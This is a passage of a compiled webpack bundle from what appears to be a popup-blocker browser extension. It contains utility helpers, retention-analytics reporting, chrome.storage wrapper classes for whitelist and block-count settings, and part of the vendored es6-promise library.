/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};

/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {

/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId])
/******/ 			return installedModules[moduleId].exports;

/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			exports: {},
/******/ 			id: moduleId,
/******/ 			loaded: false
/******/ 		};

/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);

/******/ 		// Flag the module as loaded
/******/ 		module.loaded = true;

/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}


/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;

/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;

/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";

/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports, __webpack_require__) {

	"use strict";

	var _ranger = __webpack_require__(11);

	var _ranger2 = _interopRequireDefault(_ranger);

	var _background = __webpack_require__(12);

	var _background2 = _interopRequireDefault(_background);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	(0, _background2.default)(_ranger2.default);

/***/ }),
/* 1 */
/***/ (function(module, exports) {

	"use strict";

	if (!Array.prototype.unique) {
	  Array.prototype.unique = function () {
	    var ko = {};
	    this.forEach(function (item) {
	      ko[item] = 1;
	    });
	    return Object.keys(ko);
	  };
	}

	if (!Array.prototype.remove) {
	  Array.prototype.remove = function (item) {
	    this.splice(this.indexOf(item), 1);
	  };
	}

	if (!Array.prototype.contains) {
	  Array.prototype.contains = function (item) {
	    return this.includes(item);
	  };
	}

	if (!String.prototype.endsWith) {
	  String.prototype.endsWith = function (tail) {
	    return this.lastIndexOf(tail) + tail.length === this.length - 1;
	  };
	}

/***/ }),
/* 2 */
/***/ (function(module, exports) {

	"use strict";

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	exports.now = now;
	exports.addScript = addScript;
	exports.removeScript = removeScript;
	exports.saveAsBlob = saveAsBlob;
	exports.executeCode = executeCode;
	exports.loadJsonAsset = loadJsonAsset;
	exports.isDomainInList = isDomainInList;
	exports.getDomainName = getDomainName;
	exports.toQueryString = toQueryString;
	exports.randId = randId;
	exports.GUID = GUID;
	exports.getManifestInfo = getManifestInfo;
	exports.getTodayBlockCount = getTodayBlockCount;
	exports.updateWhitelist = updateWhitelist;
	exports.copyTextToClipboard = copyTextToClipboard;
	exports.getBrowser = getBrowser;
	exports.getRandomInt = getRandomInt;
	exports.isValidUrl = isValidUrl;
	exports.getAbsoluteURL = getAbsoluteURL;
	exports.isI18N = isI18N;
	exports.getI18N = getI18N;
	exports.insertBeforeRoot = insertBeforeRoot;
	exports.sendGoogleAnalyticsEvent = sendGoogleAnalyticsEvent;
	exports.sendToBackground = sendToBackground;
	exports.sendToActiveTab = sendToActiveTab;
	exports.run = run;

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	function now() {
	  return Math.floor(Date.now() / 1000);
	}
	function addScript(template) {
	  var s = document.createElement("script");
	  if (document.querySelector("#" + template.id) != undefined) {
	    return;
	  }
	  if (template.src) {
	    s.src = template.src;
	  }
	  if (template.textContent) {
	    s.textContent = template.textContent;
	  }
	  s.setAttribute("id", template.id);
	  insertBeforeRoot(s);
	}

	function removeScript(template) {
	  var addedScript = document.querySelector("#" + template.id);
	  if (addedScript != undefined) {
	    addedScript.parentNode.removeChild(addedScript);
	  }
	}
	function saveAsBlob(url, callback) {
	  var xhr = new XMLHttpRequest();
	  xhr.open('GET', url, true);
	  xhr.responseType = 'blob';
	  xhr.onload = function (e) {
	    if (this.status == 200) {
	      var url = URL.createObjectURL(this.response);
	      callback(url);
	    }
	  };
	  xhr.send();
	}

	function executeCode(code) {
	  var s = document.createElement("script");
	  s.textContent = code;

	  insertBeforeRoot(s);

	  s.remove();
	}

	function loadJsonAsset(jsonPath) {
	  return $.getJSON(jsonPath);
	}

	/**
	 * Checks whether domain fits the whitelist
	 * @param String domain
	 * @param Array [String] domainList
	 * @returns {boolean}
	 */
	function isDomainInList(domain, domainList, returnValue) {
	  domainList = domainList || [];

	  for (var i = 0; i < domainList.length; i++) {
	    var domainTail = domainList[i];
	    if (new RegExp("\\b[(www\\.)|.*\.]?" + domainTail + "\\b").test(domain)) {
	      return returnValue ? domainTail : true;
	    }
	  }
	  return false;
	}

	function getDomainName(href) {
	  var l = document.createElement("a");
	  l.href = href;
	  return l.hostname;
	}

	function toQueryString(obj) {
	  return Object.keys(obj).filter(function (key) {
	    return !!obj[key] || false === obj[key];
	  }).map(function (key) {
	    return key + '=' + obj[key];
	  }).join('&');
	}

	function randId() {
	  var randid = localStorage.getItem("randid");
	  if (!randid) {
	    var rr = function rr() {
	      return ((1 + Math.random(Date.now() + 14)) * 0x10000 | 0).toString(28).substring(1);
	    };
	    randid = rr() + rr() + rr() + rr() + rr() + rr() + rr() + rr() + rr();
	    localStorage.setItem("randid", randid);
	  }
	  return randid;
	}

	function GUID() {
	  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
	    var r = Math.random() * 16 | 0,
	        v = c == 'x' ? r : r & 0x3 | 0x8;
	    return v.toString(16);
	  });
	}

	function getManifestInfo() {
	  return chrome.runtime.getManifest();
	}

	var Retension = exports.Retension = function () {
	  function Retension(conf) {
	    var _this = this;

	    _classCallCheck(this, Retension);

	    this.Storage = conf.Storage;
	    this.GAEvents = conf.GAEvents;
	    this.lastRetentionDay = 28;
	    this.minHoursFromInstall = 8;

	    this.Storage.requestGet().then(function (data) {
	      _this.data = _this.initialize(data);

	      _this.report();
	    });
	  }

	  _createClass(Retension, [{
	    key: "initialize",
	    value: function initialize(data) {
	      var _this2 = this;

	      if (data && data.installDate && data.sentDays) {
	        return data;
	      } else {
	        data = data || {};
	        data.installDate = data.installDate ? data.installDate : function () {
	          _this2.GAEvents.Install();

	          return Date.now();
	        }();
	        data.sentDays = data.sentDays || {};

	        this.Storage.requestSet(data);

	        return data;
	      }
	    }
	  }, {
	    key: "report",
	    value: function report() {
	      if (!this.data.completed) {
	        this.reportRetentoin();
	      }

	      this.reportAlive();

	      setTimeout(this.report.bind(this), 1000 * 60 * 60);
	    }
	  }, {
	    key: "reportRetentoin",
	    value: function reportRetentoin() {
	      var now = new Date();
	      var installDate = new Date(this.data.installDate);
	      var installStart = this.getDateStart(installDate);
	      var todayStart = this.getDateStart(now);
	      var msStartDiff = Math.abs(todayStart - installStart);
	      var hoursFromTrueInstall = Math.floor((now - installDate) / (1000 * 60 * 60));
	      var daysDiff = Math.floor(msStartDiff / (1000 * 60 * 60 * 24));

	      if (daysDiff > 0 && daysDiff <= this.lastRetentionDay) {
	        if (!this.data.sentDays[daysDiff] && hoursFromTrueInstall > this.minHoursFromInstall) {
	          this.GAEvents.Retentoin(daysDiff);

	          this.data.sentDays[daysDiff] = true;
	          this.Storage.requestSet(this.data);
	        }
	      } else if (daysDiff > this.lastRetentionDay) {
	        this.data.completed = true;

	        this.Storage.requestSet(this.data);
	      }
	    }
	  }, {
	    key: "reportAlive",
	    value: function reportAlive() {
	      var now = new Date();
	      var lastAliveTime = this.data.lastAliveTime;
	      var todayStart = this.getDateStart(now).getTime();

	      if (!lastAliveTime || lastAliveTime * 1 < todayStart) {
	        this.GAEvents.Alive();

	        this.data.lastAliveTime = now.getTime();
	        this.Storage.requestSet(this.data);
	      }
	    }
	  }, {
	    key: "getDateStart",
	    value: function getDateStart(date) {
	      return new Date(date.getFullYear(), date.getMonth(), date.getHours() >= 0 && date.getHours() < 5 ? date.getDate() - 1 : date.getDate(), 5, 0, 1); //day starts at 5PM
	    }
	  }]);

	  return Retension;
	}();

	function getTodayBlockCount(PBStorageSync, domain, callback) {
	  function isBetweenTimeRange(dateRange) {
	    var now = new Date();
	    var start = new Date(dateRange[0]);
	    var end = new Date(dateRange[1]);

	    return now >= start && now < end;
	  }

	  PBStorageSync.pb_counterBlockedSites.get().then(function (response) {
	    var data = (response || {})[domain];

	    if (data && isBetweenTimeRange(data.currentTimeRange)) {
	      callback(data.todayCount);
	    } else {
	      callback(0);
	    }
	  });
	}

	function updateWhitelist(PBStorageSync) {
	  PBStorageSync.many(PBStorageSync.pb_defaultWhitelist, PBStorageSync.pb_whitelist, PBStorageSync.pb_fullWhitelist).update(function (settings) {
	    settings.pb_fullWhitelist = settings.pb_defaultWhitelist.concat(settings.pb_whitelist).unique();

	    return settings;
	  });
	}

	function copyTextToClipboard(text) {
	  var textArea = document.createElement("textarea");

	  // Place in top-left corner of screen regardless of scroll position.
	  textArea.style.position = 'fixed';
	  textArea.style.top = 0;
	  textArea.style.left = 0;

	  // Ensure it has a small width and height. Setting to 1px / 1em
	  // doesn't work as this gives a negative w/h on some browsers.
	  textArea.style.width = '2em';
	  textArea.style.height = '2em';

	  // We don't need padding, reducing the size if it does flash render.
	  textArea.style.padding = 0;

	  // Clean up any borders.
	  textArea.style.border = 'none';
	  textArea.style.outline = 'none';
	  textArea.style.boxShadow = 'none';

	  // Avoid flash of white box if rendered for any reason.
	  textArea.style.background = 'transparent';

	  textArea.value = text;

	  document.body.appendChild(textArea);

	  textArea.select();

	  try {
	    var successful = document.execCommand('copy');
	  } catch (err) {}

	  document.body.removeChild(textArea);
	}

	function getBrowser() {
	  if (/firefox/i.test(navigator.userAgent)) {
	    return 'FF';
	  }

	  return 'CH';
	}

	function getRandomInt(min, max) {
	  return Math.floor(Math.random() * (max - min)) + min;
	}

	function isValidUrl(url) {
	  return url.indexOf("http") === 0 && !url.includes("://localhost") && !url.includes("chrome/newtab");
	}

	function getAbsoluteURL(baseURL) {
	  if (/^about:blank/i.test(baseURL)) {
	    return baseURL;
	  }

	  if (/^(https?:)?\/\//.test(baseURL)) {
	    return baseURL;
	  }

	  baseURL = location.origin + (!/^\//.test(baseURL) ? '/' : '') + baseURL;

	  return baseURL;
	}

	function isI18N(id) {
	  return !!chrome.i18n.getMessage(id);
	}

	function getI18N(msgName, alternative) {
	  return chrome.i18n.getMessage(msgName) || chrome.i18n.getMessage(alternative || msgName) || msgName;
	}

	function insertBeforeRoot(dom) {
	  var head = document.head;

	  if (head) {
	    head.appendChild(dom);
	  } else {
	    var rootDocument = document.documentElement;

	    rootDocument.insertBefore(dom, rootDocument.firstChild);
	  }
	}

	function sendGoogleAnalyticsEvent(data) {
	  sendMessageToBackground({
	    name: "trackEvent",
	    category: data.category,
	    action: data.action,
	    label: data.label,
	    isCount: data.isCount
	  });
	}

	function sendToBackground(name, data) {
	  chrome.runtime.sendMessage({ name: name, data: data || '' });
	}

	function sendToActiveTab(name, data) {
	  chrome.tabs.query({ active: true, lastFocusedWindow: true }, function (tabs) {
	    chrome.tabs.sendMessage(tabs[0].id, { name: name, data: data || '' });
	  });
	}

	function run() {}

/***/ }),
/* 3 */
/***/ (function(module, exports, __webpack_require__) {

	"use strict";

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});
	exports.PBStorage = undefined;

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }(); /**
	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      * Created by sekot on 2016-10-27.
	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      */


	var _PBStorageInstance = __webpack_require__(4);

	var _PBStorageInstance2 = _interopRequireDefault(_PBStorageInstance);

	var _PBCombinedMergedStorage = __webpack_require__(7);

	var _PBCombinedMergedStorage2 = _interopRequireDefault(_PBCombinedMergedStorage);

	var _PBCombinedMappedStorage = __webpack_require__(9);

	var _PBCombinedMappedStorage2 = _interopRequireDefault(_PBCombinedMappedStorage);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var PBStorage = function () {
	  function PBStorage(globalStore, storage) {
	    _classCallCheck(this, PBStorage);

	    this.storage = storage;
	    this.pb_defaultWhitelist = this.createStorage("pb_defaultWhitelist");
	    this.pb_detectOverlays = this.createStorage("pb_detectOverlays");
	    this.pb_hideBadge = this.createStorage("pb_hideBadge");
	    this.pb_hideNotifications = this.createStorage("pb_hideNotifications");
	    this.pb_installDate = this.createStorage("pb_installDate");
	    this.pb_overlaylist = this.createStorage("pb_overlaylist");
	    this.pb_numOfBlocks = this.createStorage("pb_numOfBlocks");
	    this.pb_totalBlocksByType = this.createStorage("pb_totalBlocksByType");
	    this.pb_tabswithoverlay = this.createStorage("pb_tabswithoverlay");
	    this.pb_whitelist = this.createStorage("pb_whitelist");
	    this.pb_fullWhitelist = new _PBCombinedMergedStorage2.default(this.pb_whitelist, this.pb_defaultWhitelist);
	    this.pb_fullWhitelist.key = "pb_fullWhitelist";
	    this.pb_counterBlockedSites = this.createStorage("pb_counterBlockedSites");
	    this.pb_pause = this.createStorage("pb_pause");
	    this.pb_siteWhenReport = this.createStorage("pb_siteWhenReport");
	    this.pb_notFirstTimeToggle = this.createStorage("pb_notFirstTimeToggle");
	    this.pb_GASettings = this.createStorage("pb_GASettings");
	    this.pb_popupBlackList = this.createStorage("pb_popupBlackList");
	    this.pb_disableContextMenu = this.createStorage("pb_disableContextMenu");
	    this.pb_retentionData = this.createStorage("pb_retentionData");
	    this.doNotShowNotifyList = this.createStorage("doNotShowNotifyList"); //hide notification on this domains list
	    this.doNotShowFollowUpNtfList = this.createStorage("doNotShowFollowUpNtfList"); //don't show again notification every x times
	    this.pb_overlayBlockedList = this.createStorage("pb_overlayBlockedList"); //list of block always overlays
	    this.pb_lastNotificationDisplay = this.createStorage("pb_lastNotificationDisplay"); //last date when notification displayed
	    this.pb_notification_size = this.createStorage("pb_notification_size"); //notification mode (maximized or minimized)
	    this.pb_rating = this.createStorage("pb_rating"); //rating every x ntfs
	    this.pb_OneTimeEvents = this.createStorage("pb_OneTimeEvents"); //do stuff one time

	    this.all = this.many(this.pb_defaultWhitelist, this.pb_detectOverlays, this.pb_hideBadge, this.pb_hideNotifications, this.pb_installDate, this.pb_overlaylist, this.pb_numOfBlocks, this.pb_tabswithoverlay, this.pb_whitelist, this.pb_fullWhitelist, this.pb_counterBlockedSites, this.pb_GASettings, this.pb_popupBlackList, this.pb_disableContextMenu, this.pb_retentionData, this.pb_pause, this.doNotShowNotifyList, this.doNotShowFollowUpNtfList, this.pb_overlayBlockedList, this.pb_rating);
	  }

	  _createClass(PBStorage, [{
	    key: "createStorage",
	    value: function createStorage(key) {
	      return new _PBStorageInstance2.default(key, this.storage);
	    }
	  }, {
	    key: "many",
	    value: function many() {
	      var store = new _PBCombinedMappedStorage2.default();
	      store.setParentStorage(this.storage);
	      store.setStorages(arguments);
	      return store;
	    }
	  }]);

	  return PBStorage;
	}();

	/**
	 * Forced singleton which is an facade-like aggregation
	 * of all available storage.
	 * @type {PBStorage}
	 */


	var PBStorageSync = new PBStorage(chrome.storage, chrome.storage.local);

	exports.default = PBStorageSync;
	exports.PBStorage = PBStorage;

/***/ }),
/* 4 */
/***/ (function(module, exports, __webpack_require__) {

	"use strict";

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var _Promise = typeof Promise === 'undefined' ? __webpack_require__(5).Promise : Promise;

	/**
	 * Created by sekot on 2016-10-27.
	 */

	/**
	 * Entity that knows how to perform read write opperations to storage
	 * @param String key name of storage
	 * @param StorageArea storage
	 * @param Event onChanged
	 * @constructor
	 */
	var PBStorageInstance = function () {
	  function PBStorageInstance(key, storage) {
	    _classCallCheck(this, PBStorageInstance);

	    this.key = key;
	    this.storage = storage;
	  }

	  /**
	   * Gets the value stored.
	   * @returns {Promise}
	   */


	  _createClass(PBStorageInstance, [{
	    key: "get",
	    value: function get() {
	      var self = this;
	      return new _Promise(function (resolve) {
	        self.storage.get(self.key, function (value) {
	          value = value[self.key];
	          self.lastAnswer = value;
	          resolve(value);
	        });
	      });
	    }

	    /**
	     * Sets the new value
	     * @param Onject value new value
	     * @returns {Promise}
	     */

	  }, {
	    key: "set",
	    value: function set(value) {
	      var self = this;
	      return new _Promise(function (resolve) {
	        var obj = {};
	        obj[self.key] = value;
	        self.storage.set(obj, resolve);
	      });
	    }

	    /**
	     * Gets current value, compares it with new and if different updates it
	     * @param Onject value new value
	     * @returns {Promise}
	     */

	  }, {
	    key: "setIfNew",
	    value: function setIfNew(value) {
	      var self = this;
	      return new _Promise(function (resolve) {
	        self.get().then(function (v) {
	          if (v == value) {
	            resolve();
	          } else {
	            self.set(value).then(resolve);
	          }
	        });
	      });
	    }

	    /**
	     * Gets the value, updates it as updateFunction requires it
	     * and sets the updated value
	     * @param Function updateFunction function(value){return updatedValue;}
	     * @returns {Promise}
	     */

	  }, {
	    key: "update",
	    value: function update(updateFunction) {
	      if (typeof updateFunction !== "function") {
	        throw new Error("Illegal invocation. Function expected.");
	      }
	      var self = this;
	      return new _Promise(function (resolve) {
	        self.get().then(function (value) {
	          var updatedValue = updateFunction(value);
	          self.setIfNew(updatedValue).then(resolve);
	        });
	      });
	    }

	    //same as set but first remove the key
	    //solves a bug that set ignores the new value

	  }, {
	    key: "removeAndSet",
	    value: function removeAndSet(value) {
	      var self = this;

	      return new _Promise(function (resolve) {
	        self.storage.remove(self.key, function () {
	          self.set(value).then(function () {
	            resolve();
	          });
	        });
	      });
	    }
	  }]);

	  return PBStorageInstance;
	}();

	exports.default = PBStorageInstance;

/***/ }),
/* 5 */
/***/ (function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(process, global) {/*!
	 * @overview es6-promise - a tiny implementation of Promises/A+.
	 * @copyright Copyright (c) 2014 Yehuda Katz, Tom Dale, Stefan Penner and contributors (Conversion to ES6 API by Jake Archibald)
	 * @license   Licensed under MIT license
	 *            See https://raw.githubusercontent.com/stefanpenner/es6-promise/master/LICENSE
	 * @version   v4.2.4+314e4831
	 */

	(function (global, factory) {
		 true ? module.exports = factory() :
		typeof define === 'function' && define.amd ? define(factory) :
		(global.ES6Promise = factory());
	}(this, (function () { 'use strict';

	function objectOrFunction(x) {
	  var type = typeof x;
	  return x !== null && (type === 'object' || type === 'function');
	}

	function isFunction(x) {
	  return typeof x === 'function';
	}



	var _isArray = void 0;
	if (Array.isArray) {
	  _isArray = Array.isArray;
	} else {
	  _isArray = function (x) {
	    return Object.prototype.toString.call(x) === '[object Array]';
	  };
	}

	var isArray = _isArray;

	var len = 0;
	var vertxNext = void 0;
	var customSchedulerFn = void 0;

	var asap = function asap(callback, arg) {
	  queue[len] = callback;
	  queue[len + 1] = arg;
	  len += 2;
	  if (len === 2) {
	    // If len is 2, that means that we need to schedule an async flush.
	    // If additional callbacks are queued before the queue is flushed, they
	    // will be processed by this flush that we are scheduling.
	    if (customSchedulerFn) {
	      customSchedulerFn(flush);
	    } else {
	      scheduleFlush();
	    }
	  }
	};

	function setScheduler(scheduleFn) {
	  customSchedulerFn = scheduleFn;
	}

	function setAsap(asapFn) {
	  asap = asapFn;
	}

	var browserWindow = typeof window !== 'undefined' ? window : undefined;
	var browserGlobal = browserWindow || {};
	var BrowserMutationObserver = browserGlobal.MutationObserver || browserGlobal.WebKitMutationObserver;
	var isNode = typeof self === 'undefined' && typeof process !== 'undefined' && {}.toString.call(process) === '[object process]';

	// test for web worker but not in IE10
	var isWorker = typeof Uint8ClampedArray !== 'undefined' && typeof importScripts !== 'undefined' && typeof MessageChannel !== 'undefined';

	// node
	function useNextTick() {
	  // node version 0.10.x displays a deprecation warning when nextTick is used recursively
	  // see https://github.com/cujojs/when/issues/410 for details
	  return function () {
	    return process.nextTick(flush);
	  };
	}

	// vertx
	function useVertxTimer() {
	  if (typeof vertxNext !== 'undefined') {
	    return function () {
	      vertxNext(flush);
	    };
	  }

	  return useSetTimeout();
	}

	function useMutationObserver() {
	  var iterations = 0;
	  var observer = new BrowserMutationObserver(flush);
	  var node = document.createTextNode('');
	  observer.observe(node, { characterData: true });

	  return function () {
	    node.data = iterations = ++iterations % 2;
	  };
	}

	// web worker
	function useMessageChannel() {
	  var channel = new MessageChannel();
	  channel.port1.onmessage = flush;
	  return function () {
	    return channel.port2.postMessage(0);
	  };
	}

	function useSetTimeout() {
	  // Store setTimeout reference so es6-promise will be unaffected by
	  // other code modifying setTimeout (like sinon.useFakeTimers())
	  var globalSetTimeout = setTimeout;
	  return function () {
	    return globalSetTimeout(flush, 1);
	  };
	}

	var queue = new Array(1000);
	function flush() {
	  for (var i = 0; i < len; i += 2) {
	    var callback = queue[i];
	    var arg = queue[i + 1];

	    callback(arg);

	    queue[i] = undefined;
	    queue[i + 1] = undefined;
	  }

	  len = 0;
	}

	function attemptVertx() {
	  try {
	    var vertx = Function('return this')().require('vertx');
	    vertxNext = vertx.runOnLoop || vertx.runOnContext;
	    return useVertxTimer();
	  } catch (e) {
	    return useSetTimeout();
	  }
	}

	var scheduleFlush = void 0;
	// Decide what async method to use to triggering processing of queued callbacks:
	if (isNode) {
	  scheduleFlush = useNextTick();
	} else if (BrowserMutationObserver) {
	  scheduleFlush = useMutationObserver();
	} else if (isWorker) {
	  scheduleFlush = useMessageChannel();
	} else if (browserWindow === undefined && "function" === 'function') {
	  scheduleFlush = attemptVertx();
	} else {
	  scheduleFlush = useSetTimeout();
	}

	function then(onFulfillment, onRejection) {
	  var parent = this;

	  var child = new this.constructor(noop);

	  if (child[PROMISE_ID] === undefined) {
	    makePromise(child);
	  }

	  var _state = parent._state;


	  if (_state) {
	    var callback = arguments[_state - 1];
	    asap(function () {
	      return invokeCallback(_state, child, callback, parent._result);
	    });
	  } else {
	    subscribe(parent, child, onFulfillment, onRejection);
	  }

	  return child;
	}

	/**
	  `Promise.resolve` returns a promise that will become resolved with the
	  passed `value`. It is shorthand for the following:

	  ```javascript
	  let promise = new Promise(function(resolve, reject){
	    resolve(1);
	  });

	  promise.then(function(value){
	    // value === 1
	  });
	  ```

	  Instead of writing the above, your code now simply becomes the following:

	  ```javascript
	  let promise = Promise.resolve(1);

	  promise.then(function(value){
	    // value === 1
	  });
	  ```

	  @method resolve
	  @static
	  @param {Any} value value that the returned promise will be resolved with
	  Useful for tooling.
	  @return {Promise} a promise that will become fulfilled with the given
	  `value`
	*/
	function resolve$1(object) {
	  /*jshint validthis:true */
	  var Constructor = this;

	  if (object && typeof object === 'object' && object.constructor === Constructor) {
	    return object;
	  }

	  var promise = new Constructor(noop);
	  resolve(promise, object);
	  return promise;
	}

	var PROMISE_ID = Math.random().toString(36).substring(2);

	function noop() {}

	var PENDING = void 0;
	var FULFILLED = 1;
	var REJECTED = 2;

	var TRY_CATCH_ERROR = { error: null };

	function selfFulfillment() {
	  return new TypeError("You cannot resolve a promise with itself");
	}

	function cannotReturnOwn() {
	  return new TypeError('A promises callback cannot return that same promise.');
	}

	function getThen(promise) {
	  try {
	    return promise.then;
	  } catch (error) {
	    TRY_CATCH_ERROR.error = error;
	    return TRY_CATCH_ERROR;
	  }
	}

	function tryThen(then$$1, value, fulfillmentHandler, rejectionHandler) {
	  try {
	    then$$1.call(value, fulfillmentHandler, rejectionHandler);
	  } catch (e) {
	    return e;
	  }
	}

	function handleForeignThenable(promise, thenable, then$$1) {
	  asap(function (promise) {
	    var sealed = false;
	    var error = tryThen(then$$1, thenable, function (value) {
	      if (sealed) {
	        return;
	      }
	      sealed = true;
	      if (thenable !== value) {
	        resolve(promise, value);
	      } else {
	        fulfill(promise, value);
	      }
	    }, function (reason) {
	      if (sealed) {
	        return;
	      }
	      sealed = true;

	      reject(promise, reason);
	    }, 'Settle: ' + (promise._label || ' unknown promise'));

	    if (!sealed && error) {
	      sealed = true;
	      reject(promise, error);
	    }
	  }, promise);
	}

	function handleOwnThenable(promise, thenable) {
	  if (thenable._state === FULFILLED) {
	    fulfill(promise, thenable._result);
	  } else if (thenable._state === REJECTED) {
	    reject(promise, thenable._result);
	  } else {
	    subscribe(thenable, undefined, function (value) {
	      return resolve(promise, value);
	    }, function (reason) {
	      return reject(promise, reason);
	    });
	  }
	}

	function handleMaybeThenable(promise, maybeThenable, then$$1) {
	  if (maybeThenable.constructor === promise.constructor && then$$1 === then && maybeThenable.constructor.resolve === resolve$1) {
	    handleOwnThenable(promise, maybeThenable);
	  } else {
	    if (then$$1 === TRY_CATCH_ERROR) {
	      reject(promise, TRY_CATCH_ERROR.error);
	      TRY_CATCH_ERROR.error = null;
	    } else if (then$$1 === undefined) {
	      fulfill(promise, maybeThenable);
	    } else if (isFunction(then$$1)) {
	      handleForeignThenable(promise, maybeThenable, then$$1);
	    } else {
	      fulfill(promise, maybeThenable);
	    }
	  }
	}

	function resolve(promise, value) {
	  if (promise === value) {
	    reject(promise, selfFulfillment());
	  } else if (objectOrFunction(value)) {
	    handleMaybeThenable(promise, value, getThen(value));
	  } else {
	    fulfill(promise, value);
	  }
	}

	function publishRejection(promise) {
	  if (promise._onerror) {
	    promise._onerror(promise._result);
	  }

	  publish(promise);
	}

	function fulfill(promise, value) {
	  if (promise._state !== PENDING) {
	    return;
	  }

	  promise._result = value;
	  promise._state = FULFILLED;

	  if (promise._subscribers.length !== 0) {
	    asap(publish, promise);
	  }
	}

	function reject(promise, reason) {
	  if (promise._state !== PENDING) {
	    return;
	  }
	  promise._state = REJECTED;
	  promise._result = reason;

	  asap(publishRejection, promise);
	}

	function subscribe(parent, child, onFulfillment, onRejection) {
	  var _subscribers = parent._subscribers;
	  var length = _subscribers.length;


	  parent._onerror = null;

	  _subscribers[length] = child;
	  _subscribers[length + FULFILLED] = onFulfillment;
	  _subscribers[length + REJECTED] = onRejection;

	  if (length === 0 && parent._state) {
	    asap(publish, parent);
	  }
	}

	function publish(promise) {
	  var subscribers = promise._subscribers;
	  var settled = promise._state;

	  if (subscribers.length === 0) {
	    return;
	  }

	  var child = void 0,
	      callback = void 0,
	      detail = promise._result;

	  for (var i = 0; i < subscribers.length; i += 3) {
	    child = subscribers[i];
	    callback = subscribers[i + settled];

	    if (child) {
	      invokeCallback(settled, child, callback, detail);
	    } else {
	      callback(detail);
	    }
	  }

	  promise._subscribers.length = 0;
	}

	function tryCatch(callback, detail) {
	  try {
	    return callback(detail);
	  } catch (e) {
	    TRY_CATCH_ERROR.error = e;
	    return TRY_CATCH_ERROR;
	  }
	}

	function invokeCallback(settled, promise, callback, detail) {
	  var hasCallback = isFunction(callback),
	      value = void 0,
	      error = void 0,
	      succeeded = void 0,
	      failed = void 0;

	  if (hasCallback) {
	    value = tryCatch(callback, detail);

	    if (value === TRY_CATCH_ERROR) {
	      failed = true;
	      error = value.error;
	      value.error = null;
	    } else {
	      succeeded = true;
	    }

	    if (promise === value) {
	      reject(promise, cannotReturnOwn());
	      return;
	    }
	  } else {
	    value = detail;
	    succeeded = true;
	  }

	  if (promise._state !== PENDING) {
	    // noop
	  } else if (hasCallback && succeeded) {
	    resolve(promise, value);
	  } else if (failed) {
	    reject(promise, error);
	  } else if (settled === FULFILLED) {
	    fulfill(promise, value);
	  } else if (settled === REJECTED) {
	    reject(promise, value);
	  }
	}

	function initializePromise(promise, resolver) {
	  try {
	    resolver(function resolvePromise(value) {
	      resolve(promise, value);
	    }, function rejectPromise(reason) {
	      reject(promise, reason);
	    });
	  } catch (e) {
	    reject(promise, e);
	  }
	}

	var id = 0;
	function nextId() {
	  return id++;
	}

	function makePromise(promise) {
	  promise[PROMISE_ID] = id++;
	  promise._state = undefined;
	  promise._result = undefined;
	  promise._subscribers = [];
	}

	function validationError() {
	  return new Error('Array Methods must be provided an Array');
	}

	var Enumerator = function () {
	  function Enumerator(Constructor, input) {
	    this._instanceConstructor = Constructor;
	    this.promise = new Constructor(noop);

	    if (!this.promise[PROMISE_ID]) {
	      makePromise(this.promise);
	    }

	    if (isArray(input)) {
	      this.length = input.length;
	      this._remaining = input.length;

	      this._result = new Array(this.length);

	      if (this.length === 0) {
	        fulfill(this.promise, this._result);
	      } else {
	        this.length = this.length || 0;
	        this._enumerate(input);
	        if (this._remaining === 0) {
	          fulfill(this.promise, this._result);
	        }
	      }
	    } else {
	      reject(this.promise, validationError());
	    }
	  }

	  Enumerator.prototype._enumerate = function _enumerate(input) {
	    for (var i = 0; this._state === PENDING && i < input.length; i++) {
	      this._eachEntry(input[i], i);
	    }
	  };
